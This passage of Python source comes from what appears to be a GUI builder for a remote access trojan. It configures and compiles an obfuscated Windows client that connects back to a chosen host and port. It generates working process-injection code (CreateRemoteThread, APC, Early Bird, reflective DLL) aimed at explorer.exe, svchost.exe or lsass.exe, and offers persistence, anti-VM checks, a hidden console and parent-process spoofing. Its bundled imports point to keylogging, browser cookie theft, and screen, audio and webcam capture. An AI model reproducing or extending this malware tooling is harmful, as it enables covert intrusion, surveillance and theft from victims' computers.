        
        # Initialize UI state
        self.toggle_persistence_options()
        self.toggle_mutex_options()
        
        # Register with theme manager
        self.register_with_theme_manager()
    
    
    
    def setup_injection_ui(self):
        """Set up the process injection UI elements"""
        theme = self.get_theme_colors()
        
        # Create injection frame in stealth options
        injection_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        injection_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Enable process injection checkbox
        self.injection_var = tk.BooleanVar(value=self.build_options.get("process_injection", False))
        injection_checkbox = ctk.CTkCheckBox(injection_frame, text="Enable Process Injection", 
                                        variable=self.injection_var,
                                        onvalue=True, offvalue=False,
                                        command=self.toggle_injection_options,
                                        checkbox_width=20,
                                        checkbox_height=20,
                                        fg_color=theme["accent_color"])
        injection_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(injection_checkbox)
        
        # Injection method dropdown
        method_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        method_frame.pack(fill=tk.X, padx=10, pady=5)
        
        method_label = ctk.CTkLabel(method_frame, text="Injection Method:", width=150)
        method_label.pack(side=tk.LEFT, padx=5)
        
        self.injection_method_var = tk.StringVar(value=self.build_options.get("injection_method", "createremotethread"))
        self.method_dropdown = ctk.CTkOptionMenu(method_frame, 
                                        values=["createremotethread", "reflectivedll", "apc", "earlybird"],
                                        variable=self.injection_method_var,
                                        fg_color=theme["button_color"],
                                        button_color=theme["button_color"],
                                        button_hover_color=theme["hover_color"], state='disabled')
        self.method_dropdown.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(self.method_dropdown)
        
        # Target process options
        process_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        process_frame.pack(fill=tk.X, padx=10, pady=5)
        
        process_label = ctk.CTkLabel(process_frame, text="Target Process:", width=150)
        process_label.pack(side=tk.LEFT, padx=5)
        
        # Common processes that are typically long-running and have high privileges
        default_processes = ["explorer.exe", "svchost.exe", "lsass.exe", "winlogon.exe", "rundll32.exe", "conhost.exe"]
        self.process_var = tk.StringVar(value=self.build_options.get("target_process", "explorer.exe"))
        
        self.process_dropdown = ctk.CTkOptionMenu(process_frame, 
                                        values=default_processes,
                                        variable=self.process_var,
                                        fg_color=theme["button_color"],
                                        button_color=theme["button_color"],
                                        button_hover_color=theme["hover_color"], state='disabled')
        self.process_dropdown.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(self.process_dropdown)
        
        # Custom process entry
        custom_process_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        custom_process_frame.pack(fill=tk.X, padx=10, pady=5)
        
        custom_process_label = ctk.CTkLabel(custom_process_frame, text="Custom Process:", width=150)
        custom_process_label.pack(side=tk.LEFT, padx=5)
        
        self.custom_process_entry = ctk.CTkEntry(custom_process_frame, width=200, state='disabled')
        self.custom_process_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.custom_process_entry.insert(0, self.build_options.get("custom_process", ""))
        self.theme_widgets.append(self.custom_process_entry)
        
        # Process selection method
        selection_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        selection_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.process_selection_var = tk.StringVar(value=self.build_options.get("process_selection", "fixed"))
        
        self.fixed_radio = ctk.CTkRadioButton(selection_frame, text="Fixed Process", 
                                    variable=self.process_selection_var,
                                    value="fixed",
                                    fg_color=theme["accent_color"], state='disabled')
        self.fixed_radio.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(self.fixed_radio)
        
        self.auto_radio = ctk.CTkRadioButton(selection_frame, text="Auto-select from running processes", 
                                    variable=self.process_selection_var,
                                    value="auto",
                                    fg_color=theme["accent_color"], state='disabled')
        self.auto_radio.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(self.auto_radio)
        
        # Parent-child relation
        parent_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        parent_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.spoofed_parent_var = tk.BooleanVar(value=self.build_options.get("spoofed_parent", False))
        self.parent_checkbox = ctk.CTkCheckBox(parent_frame, text="Use spoofed parent process", 
                                    variable=self.spoofed_parent_var,
                                    onvalue=True, offvalue=False,
                                    checkbox_width=20,
                                    checkbox_height=20,
                                    fg_color=theme["accent_color"], state='disabled')
        self.parent_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(self.parent_checkbox)
        
    def toggle_injection_options(self):
        """Enable/disable injection options based on checkbox state"""
        is_enabled = self.injection_var.get()
        
        if is_enabled:
            self.injection_method_var.set(self.build_options["injection_method"])
            self.method_dropdown.configure(state='normal')
            self.process_dropdown.configure(state='normal')
            self.custom_process_entry.configure(state='normal')
            self.auto_radio.configure(state='normal')
            self.fixed_radio.configure(state='normal')
            self.parent_checkbox.configure(state='normal')
        else:
            self.method_dropdown.configure(state='disabled')
            self.process_dropdown.configure(state='disabled')
            self.custom_process_entry.configure(state='disabled')
            self.auto_radio.configure(state='disabled')
            self.fixed_radio.configure(state='disabled')
            self.parent_checkbox.configure(state='disabled')
            
    # Method to update build options with injection settings
    def update_injection_options(self):
        """Update build options with current injection settings"""
        self.build_options["process_injection"] = self.injection_var.get()
        self.build_options["injection_method"] = self.injection_method_var.get()
        
        if self.custom_process_entry.get().strip():
            self.build_options["target_process"] = self.custom_process_entry.get().strip()
        else:
            self.build_options["target_process"] = self.process_var.get()
            
        self.build_options["process_selection"] = self.process_selection_var.get()
        self.build_options["spoofed_parent"] = self.spoofed_parent_var.get()
        self.build_options["custom_process"] = self.custom_process_entry.get()
        
        
    def generate_injection_code(self):
        """Generate the appropriate process injection code based on selected method"""
        method = self.build_options.get("injection_method", "createremotethread")
        target_process = self.build_options.get("target_process", "explorer.exe")
        process_selection = self.build_options.get("process_selection", "fixed")
        spoofed_parent = self.build_options.get("spoofed_parent", False)
        
        # Base imports and helper functions
        injection_code = """
# Process injection functionality
import os
import sys
import time
import ctypes
import platform
from ctypes import wintypes

# Constants for Windows API
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
VIRTUAL_MEM = (MEM_COMMIT | MEM_RESERVE)
PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_QUERY_INFORMATION = 0x0400

# Function to find process ID by name
def find_process_id(process_name):
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == process_name.lower():
                    return proc.info['pid']
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return None
    except ImportError:
        # Fallback if psutil isn't available
        import subprocess
        import re
        
        if platform.system() == 'Windows':
            process = subprocess.Popen(['tasklist'], stdout=subprocess.PIPE)
            output = process.communicate()[0].decode('cp437')
            for line in output.splitlines():
                if process_name.lower() in line.lower():
                    pid = re.findall(r'\\d+', line)
                    if pid:
                        return int(pid[0])
        return None

# Get current process as shellcode
def get_self_as_shellcode():
    # Read current executable into memory
    try:
        with open(sys.executable, 'rb') as f:
            shellcode = f.read()
        return shellcode
    except:
        # If we're running as a Python script
        try:
            with open(sys.argv[0], 'rb') as f:
                code = f.read()
            
            # Simple obfuscation of the Python script
            import zlib
            compressed = zlib.compress(code)
            
            # Create a bootstrap shellcode that executes the Python code
            bootstrap = f'''
import sys
import zlib
import base64
code = zlib.decompress(base64.b64decode({repr(base64.b64encode(compressed).decode())}))
exec(code)
'''.encode()
            return bootstrap
        except:
            return None
    """

        # Add method-specific code
        if method == "createremotethread":
            injection_code += """
# CreateRemoteThread injection
def inject_with_createremotethread(pid, shellcode):
    try:
        # Get handle to the target process
        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            print(f"[!] Could not open process (PID: {pid})")
            return False
        
        # Allocate memory in the target process
        arg_address = ctypes.windll.kernel32.VirtualAllocEx(
            h_process, 
            0, 
            len(shellcode), 
            VIRTUAL_MEM, 
            PAGE_EXECUTE_READWRITE
        )
        
        # Write shellcode to the allocated memory
        written = ctypes.c_size_t(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            h_process,
            arg_address,
            shellcode,
            len(shellcode),
            ctypes.byref(written)
        )
        
        # Create a remote thread that executes the shellcode
        thread_id = ctypes.c_ulong(0)
        if not ctypes.windll.kernel32.CreateRemoteThread(
            h_process,
            None,
            0,
            arg_address,
            None,
            0,
            ctypes.byref(thread_id)
        ):
            print("[!] Failed to create remote thread")
            return False
            
        print(f"[+] Remote thread created with ID: {thread_id.value}")
        return True
        
    except Exception as e:
        print(f"[!] Error during injection: {e}")
        return False
    """
        elif method == "apc":
            injection_code += """
# APC (Asynchronous Procedure Call) Queue Injection
def inject_with_apc(pid, shellcode):
    try:
        # Constants for APC
        QUEUE_USER_APC = ctypes.windll.kernel32.QueueUserAPC
        
        # Get handle to target process
        h_process = ctypes.windll.kernel32.OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
            False,
            pid
        )
        
        if not h_process:
            print(f"[!] Could not open process (PID: {pid})")
            return False
            
        # Allocate memory in target process
        arg_address = ctypes.windll.kernel32.VirtualAllocEx(
            h_process, 
            0, 
            len(shellcode), 
            VIRTUAL_MEM, 
            PAGE_EXECUTE_READWRITE
        )
        
        # Write shellcode to allocated memory
        written = ctypes.c_size_t(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            h_process,
            arg_address,
            shellcode,
            len(shellcode),
            ctypes.byref(written)
        )
        
        # Enumerate threads in the target process
        import ctypes.wintypes
        import win32process
        import win32con
        import win32api
        
        snapshot = win32api.CreateToolhelp32Snapshot(win32con.TH32CS_SNAPTHREAD, 0)
        thread_entry = win32process.THREADENTRY32()
        thread_entry.dwSize = ctypes.sizeof(thread_entry)
        
        success = False
        
        # Loop through threads and inject APC into them
        ret = win32process.Thread32First(snapshot, ctypes.byref(thread_entry))
        while ret:
            if thread_entry.th32OwnerProcessID == pid:
                # Get thread handle
                h_thread = ctypes.windll.kernel32.OpenThread(
                    win32con.THREAD_SET_CONTEXT,
                    False,
                    thread_entry.th32ThreadID
                )
                
                if h_thread:
                    # Queue APC to thread
                    if QUEUE_USER_APC(arg_address, h_thread, 0):
                        print(f"[+] APC queued to thread {thread_entry.th32ThreadID}")
                        success = True
                    
                    # Close thread handle
                    ctypes.windll.kernel32.CloseHandle(h_thread)
            
            # Get next thread
            ret = win32process.Thread32Next(snapshot, ctypes.byref(thread_entry))
        
        # Close handles
        win32api.CloseHandle(snapshot)
        ctypes.windll.kernel32.CloseHandle(h_process)
        
        return success
            
    except Exception as e:
        print(f"[!] Error during APC injection: {e}")
        return False
    """
        elif method == "earlybird":
            injection_code += """
# Early Bird Injection (Process Creation + Thread Hijacking)
def inject_with_earlybird(target_process, shellcode):
    try:
        import win32process
        import win32con
        import win32api
        import win32security
        
        # Create process in suspended state
        startup_info = win32process.STARTUPINFO()
        security_attrs = win32security.SECURITY_ATTRIBUTES()
        security_attrs_thread = win32security.SECURITY_ATTRIBUTES()
        
        # Create the process suspended
        proc_info = win32process.CreateProcess(
            None,                           # Application name
            target_process,                 # Command line
            security_attrs,                 # Process attributes
            security_attrs_thread,          # Thread attributes
            False,                          # Inherit handles
            win32con.CREATE_SUSPENDED,      # Creation flags
            None,                           # Environment
            None,                           # Current directory
            startup_info                    # Startup info
        )
        
        # Get handle to the process
        h_process = proc_info[0]
        h_thread = proc_info[1]
        
        # Allocate memory in the suspended process
        arg_address = ctypes.windll.kernel32.VirtualAllocEx(
            h_process, 
            0, 
            len(shellcode), 
            VIRTUAL_MEM, 
            PAGE_EXECUTE_READWRITE
        )
        
        # Write shellcode to allocated memory
        written = ctypes.c_size_t(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            h_process,
            arg_address,
            shellcode,
            len(shellcode),
            ctypes.byref(written)
        )
        
        # Get thread context
        context = win32process.GetThreadContext(h_thread, win32con.CONTEXT_FULL)
        
        # Set the instruction pointer to our shellcode
        context.Eip = arg_address
        
        # Set the new context
        win32process.SetThreadContext(h_thread, context)
        
        # Resume the thread
        win32process.ResumeThread(h_thread)
        
        return True
        
    except Exception as e:
        print(f"[!] Error during early bird injection: {e}")
        return False
    """
        elif method == "reflectivedll":
            injection_code += """
# Reflective DLL Injection
def inject_with_reflectivedll(pid, shellcode):
    try:
        # For reflective DLL injection, we need to create a DLL on-the-fly
        import tempfile
        import shutil
        
        # Convert our shellcode to a DLL format with reflective loader
        dll_template = b'''
        // DLL template with reflective loading capability
        #include <windows.h>
        
        // Our shellcode
        unsigned char payload[] = {{{shellcode_bytes}}};
        
        BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
            switch (ul_reason_for_call) {{
                case DLL_PROCESS_ATTACH:
                    // Create a new thread to execute our shellcode
                    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
                    break;
            }}
            return TRUE;
        }}
        '''
        
        # Format shellcode as C byte array
        shellcode_bytes = ','.join([f'0x{b:02x}' for b in shellcode])
        dll_code = dll_template.replace(b'{{{shellcode_bytes}}}', shellcode_bytes.encode())
        
        # Write to temp file
        temp_dir = tempfile.mkdtemp()
        dll_source_path = os.path.join(temp_dir, "reflective.c")
        dll_output_path = os.path.join(temp_dir, "reflective.dll")
        
        with open(dll_source_path, 'wb') as f:
            f.write(dll_code)
        
        # Compile DLL using system compiler (assumes MinGW or similar is installed)
        import subprocess
        compile_result = subprocess.run([
            "gcc", 
            "-shared", 
            "-o", dll_output_path,
            dll_source_path
        ], capture_output=True)
        
        if compile_result.returncode != 0:
            print(f"[!] Failed to compile DLL: {compile_result.stderr.decode()}")
            return False
        
        # Load the DLL
        with open(dll_output_path, 'rb') as f:
            dll_data = f.read()
        
        # Clean up temp files
        shutil.rmtree(temp_dir)
        
        # Now inject the DLL into the target process
        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            print(f"[!] Could not open process (PID: {pid})")
            return False
        
        # Allocate memory for DLL path
        path_size = len(dll_output_path) + 1
        path_address = ctypes.windll.kernel32.VirtualAllocEx(
            h_process, 
            0, 
            path_size, 
            VIRTUAL_MEM, 
            PAGE_EXECUTE_READWRITE
        )
        
        # Write DLL path to allocated memory
        written = ctypes.c_size_t(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            h_process,
            path_address,
            dll_output_path.encode(),
            path_size,
            ctypes.byref(written)
        )
        
        # Get address of LoadLibraryA
        loadlib_addr = ctypes.windll.kernel32.GetProcAddress(
            ctypes.windll.kernel32.GetModuleHandleA(b"kernel32.dll"),
            b"LoadLibraryA"
        )
        
        # Create a remote thread that calls LoadLibraryA with the DLL path
        thread_id = ctypes.c_ulong(0)
        if not ctypes.windll.kernel32.CreateRemoteThread(
            h_process,
            None,
            0,
            loadlib_addr,
            path_address,
            0,
            ctypes.byref(thread_id)
        ):
            print("[!] Failed to create remote thread")
            return False
            
        print(f"[+] Remote thread created with ID: {thread_id.value}")
        return True
        
    except Exception as e:
        print(f"[!] Error during reflective DLL injection: {e}")
        return False
    """

        # Main injection function that selects the appropriate method
        process_selection_code = ""
        if process_selection == "fixed":
            process_selection_code = f"""
        # Use fixed process name
        target_process = "{target_process}"
        pid = find_process_id(target_process)
        if not pid:
            print(f"[!] Process {{target_process}} not found")
            return False
    """
        else:  # auto selection
            process_selection_code = """
        # Auto-select from common processes
        common_processes = ["explorer.exe", "svchost.exe", "winlogon.exe", "rundll32.exe", "conhost.exe"]
        for proc in common_processes:
            pid = find_process_id(proc)
            if pid:
                target_process = proc
                print(f"[+] Selected process {proc} (PID: {pid})")
                break
        
        if not pid:
            print("[!] No suitable target process found")
            return False
    """

        injection_function = f"""
def inject_into_process():
    # Check if we're on Windows
    if platform.system() != 'Windows':
        print("[!] Process injection is only supported on Windows")
        return False
    
    try:
{process_selection_code}
        
        # Get shellcode (our own process code)
        shellcode = get_self_as_shellcode()
        if not shellcode:
            print("[!] Failed to get shellcode")
            return False
            
        print(f"[+] Injecting into process {{target_process}} (PID: {{pid}})")
        
        # Use the selected injection method
        if "{method}" == "createremotethread":
            return inject_with_createremotethread(pid, shellcode)
        elif "{method}" == "apc":
            return inject_with_apc(pid, shellcode)
        elif "{method}" == "earlybird":
            return inject_with_earlybird(target_process, shellcode)
        elif "{method}" == "reflectivedll":
            return inject_with_reflectivedll(pid, shellcode)
        else:
            print(f"[!] Unknown injection method: {method}")
            return False
            
    except Exception as e:
        print(f"[!] Error during injection: {{e}}")
        return False
    """

        injection_code += injection_function
        return injection_code

    def toggle_persistence_options(self):
        """Enable/disable persistence options based on checkbox state"""
        if self.persistence_var.get():
            self.persistence_method_var.set(self.build_options["persistence_method"])
            self.startup_name_entry.configure(state="normal")
        else:
            self.startup_name_entry.configure(state="disabled")
    
    def toggle_mutex_options(self):
        """Enable/disable mutex options based on checkbox state"""
        if self.mutex_var.get():
            self.mutex_name_entry.configure(state="normal")
        else:
            self.mutex_name_entry.configure(state="disabled")
    
    def use_current_settings(self):
        """Use the current server settings for the client"""
        if hasattr(self.rat_app, 'ip'):
            self.host_entry.delete(0, tk.END)
            self.host_entry.insert(0, self.rat_app.ip)
        
        if hasattr(self.rat_app, 'port'):
            self.port_entry.delete(0, tk.END)
            self.port_entry.insert(0, str(self.rat_app.port))
    
    def browse_output_dir(self):
        """Browse for output directory"""
        directory = filedialog.askdirectory(title="Select Output Directory")
        if directory:
            self.outdir_entry.delete(0, tk.END)
            self.outdir_entry.insert(0, directory)
    
    def browse_icon_file(self):
        """Browse for icon file"""
        icon_file = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if icon_file:
            self.icon_entry.delete(0, tk.END)
            self.icon_entry.insert(0, icon_file)
    

    def get_embedded_template(self):
        """Get the embedded client template if available"""
        # This would be filled in with a base64-encoded template if you embed it
        # Currently returns None
        return None
    
    def extract_client_code_from_paste(self):
        return self.client_code

            
    def log_message(self, message, is_error=False):
        """Add a message to the build log"""
        
        if 'PYZ' in message or 'Analyzing' in message or 'written' in message:
            message = 'Building in progress please wait'
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        prefix = "[ERROR] " if is_error else "[INFO] "
        log_entry = f"[{timestamp}] {prefix}{message}\n"
        
        # Add to the log display
        self.build_log.configure(state="normal")
        if is_error:
            # Apply tag for error messages if needed
            current_pos = self.build_log.index(tk.END)
            self.build_log.insert(tk.END, log_entry)
            self.build_log.tag_add("error", current_pos, f"{current_pos}+{len(log_entry)}c")
            self.build_log.tag_config("error", foreground="red")
        else:
            
            self.build_log.insert(tk.END, log_entry)
        
        self.build_log.see(tk.END)
        self.build_log.configure(state="disabled")
        
        # Add to the list for later reference
        self.build_logs.append(log_entry)
        
        # Also log to console for debugging
        print(log_entry.strip())
        
    def build_client(self, compile_exe=False):
        """Build the client based on current settings"""
        if self.is_building:
            messagebox.showinfo("Build in Progress", "A build is already in progress. Please wait.")
            return
            
        # Clear build log
        self.build_log.configure(state="normal")
        self.build_log.delete(1.0, tk.END)
        self.build_log.configure(state="disabled")
        self.build_logs = []
        
        # Update and validate options
        self.update_build_options()
        
        # Override compile option if explicitly set

        self.build_options["compile_to_exe"] = True
            
        # Validate options
        errors = self.validate_build_options()
        if errors:
            error_msg = "Cannot build client due to the following errors:\n\n" + "\n".join(errors)
            self.log_message(error_msg, is_error=True)
            messagebox.showerror("Build Error", error_msg)
            return
            
        # Start build in a separate thread to keep UI responsive
        self.is_building = True
        build_thread = threading.Thread(target=self._build_client_thread)
        build_thread.daemon = True
        build_thread.start()
        
    def _build_client_thread(self):
        """Worker thread for building the client"""
        temp_output_path = None
        try:
            self.log_message("Starting client build process...")
        
            # Check if client template is loaded
            if not self.client_code:
                self.is_building = False
                if not self.client_code:
                    self.log_message("Error: No client template available", is_error=True)
                    return
        
            # Get configuration for client
            host = self.build_options["host"]
            port = self.build_options["port"]
            obfuscation_level = self.build_options["obfuscation"]
        
            self.log_message(f"Building client with configuration:")
            self.log_message(f"  - Host: {host}:{port}")
            self.log_message(f"  - Obfuscation: Level {obfuscation_level}")
        
            # Create the modified client code
            modified_code = self.customize_client_code()
        
            # Apply obfuscation if requested
            if obfuscation_level > 0:
                self.log_message(f"Applying obfuscation (Level {obfuscation_level})...")
                modified_code = self.obfuscate_code(modified_code, obfuscation_level)
        
            # Generate output file path in temp directory
            output_filename = self.build_options["file_name"]
            if not output_filename.endswith('.exe'):
                output_filename += '.exe'
            
            # Create temp directory if it doesn't exist
            temp_dir = os.path.join(tempfile.gettempdir(), ''.join(random.choices('QIAXERJ', k=16)))
            os.makedirs(temp_dir, exist_ok=True)
            
            # Store in temp directory
            temp_output_path = os.path.join(temp_dir, output_filename)
            
            # Final output path (for reference/display only)
            final_output_path = os.path.join(self.build_options["output_dir"], output_filename)
        
            # Write the Python file to temp location
            with open(temp_output_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(modified_code)
            
            # self.log_message(f"Python client written to temporary location: {temp_output_path}")
        
            # Compile to EXE if requested
            if self.build_options["compile_to_exe"]:
                self.compile_to_exe(temp_output_path)
                
            shutil.copy2(temp_output_path, final_output_path)
            
            self.log_message("Client build completed successfully!")
        
            # Show success message
            self.rat_app.root.after(0, lambda: messagebox.showinfo("Build Complete",
                f"Client built successfully!\n\nLocation: {final_output_path}"))
    
        except Exception as e:
            self.log_message(f"Error building client: {str(e)}", is_error=True)
            # Show error in GUI thread
            self.rat_app.root.after(0, lambda: messagebox.showerror("Build Error",
                f"Error building client: {str(e)}"))
    
        finally:
            self.is_building = False
            # Clean up the temporary file
            if temp_output_path and os.path.exists(temp_output_path):
                try:
                    os.remove(temp_output_path)
                    
                    # Also try to remove the temp directory if it's empty
                    if os.path.exists(temp_dir) and not os.listdir(temp_dir):
                        os.rmdir(temp_dir)
                        # self.log_message("Temporary directory removed")
                except Exception as e:
                    pass
            
    def update_build_options(self):
        """Collect all options from the UI into the build_options dictionary"""
        # Connection settings
        self.build_options["host"] = self.host_entry.get()
        try:
            self.build_options["port"] = int(self.port_entry.get())
        except ValueError:
            self.build_options["port"] = 4444
        
        # Build settings
        self.build_options["file_name"] = self.filename_entry.get()
        self.build_options["output_dir"] = self.outdir_entry.get()
        self.build_options["icon_path"] = self.icon_entry.get()
        self.build_options["obfuscation"] = self.obfuscation_var.get()
        
        # Stealth options
        self.build_options["persistence"] = self.persistence_var.get()
        self.build_options["persistence_method"] = self.persistence_method_var.get()
        self.build_options["startup_name"] = self.startup_name_entry.get()
        self.build_options["hide_console"] = self.hide_console_var.get()
        self.build_options["anti_vm"] = self.antivm_var.get()
        self.build_options["mutex_enabled"] = self.mutex_var.get()
        self.build_options["mutex_name"] = self.mutex_name_entry.get()
        
        self.update_injection_options()
    
    def validate_build_options(self):
        """Validate the build options before starting the build"""
        errors = []
        
        # Check host and port
        if not self.build_options["host"]:
            errors.append("Host cannot be empty")
        
        try:
            port = int(self.build_options["port"])
            if port < 1 or port > 65535:
                errors.append("Port must be between 1 and 65535")
        except ValueError:
            errors.append("Port must be a valid number")
        
        # Check file name
        if not self.build_options["file_name"]:
            errors.append("File name cannot be empty")
            
        # Check output directory
        if not os.path.exists(self.build_options["output_dir"]):
            try:
                os.makedirs(self.build_options["output_dir"])
            except:
                errors.append("Invalid output directory")
        
        # Check icon file if specified
        if self.build_options["icon_path"] and not os.path.exists(self.build_options["icon_path"]):
            errors.append("Icon file not found")
        
        # Return errors if any, otherwise None
        return errors if errors else None
    
    
    def compile_to_exe(self, python_file_path):
        """Compile the Python script to an executable using PyInstaller"""
        self.log_message("Starting compilation to EXE...")
        
        try:
            import subprocess
            import os
            import sys
            
            # Get output directory (same as the Python file)
            output_dir = os.path.dirname(python_file_path)
            file_name = os.path.basename(python_file_path)
            file_base_name = os.path.splitext(file_name)[0]
            
            # Check if PyInstaller is installed
            try:
                subprocess.run(["pyinstaller", "--version"], 
                            check=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE)
            except (subprocess.SubprocessError, FileNotFoundError):
                self.log_message("PyInstaller not found. Attempting to install...", is_error=True)
                
                try:
                    # Try to install PyInstaller using pip
                    pip_command = [sys.executable, "-m", "pip", "install", "pyinstaller"]
                    self.log_message(f"Running: {' '.join(pip_command)}")
                    
                    install_process = subprocess.run(pip_command, 
                                                    check=True, 
                                                    stdout=subprocess.PIPE, 
                                                    stderr=subprocess.PIPE)
                    
                    self.log_message("PyInstaller installed successfully")
                except subprocess.SubprocessError as e:
                    self.log_message(f"Failed to install PyInstaller: {e}", is_error=True)
                    self.log_message("Please install PyInstaller manually: pip install pyinstaller", is_error=True)
                    raise Exception("PyInstaller not available. Please install it manually.")
            
            # Build arguments for PyInstaller
            pyinstaller_args = [
                "pyinstaller",
                "--onefile",  # Create a single executable
                "--clean",    # Clean cache before building
                "--noconsole" if self.build_options["hide_console"] else "",  # Hide console if requested
            ]
            
            # Add icon if specified
            if self.build_options["icon_path"] and os.path.exists(self.build_options["icon_path"]):
                pyinstaller_args.append(f"--icon={self.build_options['icon_path']}")
                self.log_message(f"Using icon: {self.build_options['icon_path']}")
            
            # Add hidden imports for used modules
            hidden_imports = [
                "socket", "threading", "time", "struct", "os", "random", 
                "io", "zlib", "numpy", "pyaudio", "PIL.ImageGrab", "PIL.Image",
                "tkinter", "pynput", "pynput.keyboard", "ctypes", "psutil", "json", "pyautogui", "scapy.all",
                "win32clipboard", "browser_cookie3", "winreg", "cv2", "pyautogui"
            ]
            
            
            # Add each hidden import to the arguments
            for imp in hidden_imports:
                pyinstaller_args.append(f"--hidden-import={imp}")
            
            # Add the Python file to compile
            pyinstaller_args.append(python_file_path)
            
            # Filter out empty arguments
            pyinstaller_args = [arg for arg in pyinstaller_args if arg]
            
            # Execute PyInstaller
            # self.log_message(f"Running PyInstaller with arguments: {' '.join(pyinstaller_args)}")
            
            # Create a temporary file to capture output
            log_file_path = os.path.join(output_dir, "pyinstaller_log.txt")
            
            with open(log_file_path, 'w') as log_file:
                process = subprocess.Popen(
                    pyinstaller_args,
                    stdout=log_file,
                    stderr=subprocess.STDOUT,
                    cwd=output_dir,
                    universal_newlines=True
                )
                
                # Update log periodically
                while process.poll() is None:
                    self.log_message("Compiling... (this may take a few minutes)")
                    
                    # Read the current log content
                    with open(log_file_path, 'r') as f:
                        log_content = f.read()
                        lines = log_content.splitlines()
                        
                        # Extract recent progress updates if available
                        recent_lines = lines[-5:] if len(lines) > 5 else lines
                        for line in recent_lines:
                            if line.strip() and not line.startswith(" "):
                                self.log_message(f"PyInstaller: {line}")
                    
                    # Wait before checking again
                    for _ in range(5):  # Check every 5 seconds
                        if process.poll() is not None:
                            break
                        time.sleep(1)
            
            # Check if compilation was successful
            return_code = process.poll()
            
            if return_code == 0:
                # Get the path to the generated EXE
                exe_path = os.path.join(output_dir, "dist", f"{file_base_name}.exe")
                
                if os.path.exists(exe_path):
                    # Move the EXE to the output directory
                    final_exe_path = os.path.join(output_dir, f"{file_base_name}.exe")
                    if os.path.exists(final_exe_path):
                        os.remove(final_exe_path)
                    
                    import shutil
                    shutil.move(exe_path, final_exe_path)
                    
                    # Clean up build files if successful
                    build_dir = os.path.join(output_dir, "build")
                    dist_dir = os.path.join(output_dir, "dist")
                    spec_file = os.path.join(output_dir, f"{file_base_name}.spec")
                    
                    if os.path.exists(build_dir):
                        shutil.rmtree(build_dir)
                    if os.path.exists(dist_dir):
                        shutil.rmtree(dist_dir)
                    if os.path.exists(spec_file):
                        os.remove(spec_file)
                        
                    return final_exe_path
                else:
                    self.log_message("Compilation appeared to succeed but EXE not found", is_error=True)
                    
                    # Try to find the actual exe
                    for root, _, files in os.walk(output_dir):
                        for file in files:
                            if file.endswith('.exe') and file_base_name in file:
                                full_path = os.path.join(root, file)
                                self.log_message(f"Found executable at: {full_path}")
                                return full_path
                    
                    raise Exception("EXE file not found after compilation")
            else:
                # Read the PyInstaller log for error information
                with open(log_file_path, 'r') as f:
                    log_content = f.read()
                
                # Look for error messages in the log
                error_lines = []
                for line in log_content.splitlines():
                    if "error:" in line.lower() or "traceback" in line.lower():
                        error_lines.append(line)
                
                error_summary = "\n".join(error_lines[-10:]) if error_lines else "Unknown error"
                self.log_message(f"Compilation failed with return code {return_code}", is_error=True)
                self.log_message(f"Error details: {error_summary}", is_error=True)
                
                raise Exception(f"PyInstaller failed with return code {return_code}")
        
        except Exception as e:
            self.log_message(f"Error compiling to EXE: {str(e)}", is_error=True)
            raise
    
    # A complete solution for the string obfuscation that handles all edge cases

    def obfuscate_code(self, code, level=1):
        """Obfuscate the client code at the specified level"""
        self.log_message(f"Applying level {level} obfuscation...")
        
        if level == 0:
            return code  # No obfuscation
        
        import random
        import base64
        import re
        
        # Original code backup
        original_code = code
        
        try:
            # Level 1: Basic variable and function renaming
            if level >= 1:
                # self.log_message("Level 1: Renaming variables and functions...")
                
                # Don't rename these
                preserved = [
                    'self', 'socket', 'threading', 'time', 'struct', 'os', 'random', 
                    'io', 'zlib', 'cv2', 'numpy', 'pyaudio', 'PIL', 'ImageGrab', 'Image',
                    'tkinter', 'pynput', 'keyboard', 'sys', 'ctypes', 'datetime', 
                    'psutil', 'json', 'subprocess', 'main', '__init__', '__main__', '__name__',
                    'name', 'connect', 'target', 'start', 'family', 'filter', 'append', 'exist_ok',
                    'errors', 'shell', 'stdout', 'stdin', 'size', 'dirs', 'stderr', 'output', 'text',
                    'timeout', 'subkey', 'format', 'channels', 'rate', 'input', 'exception_on_overflow', 'interval',
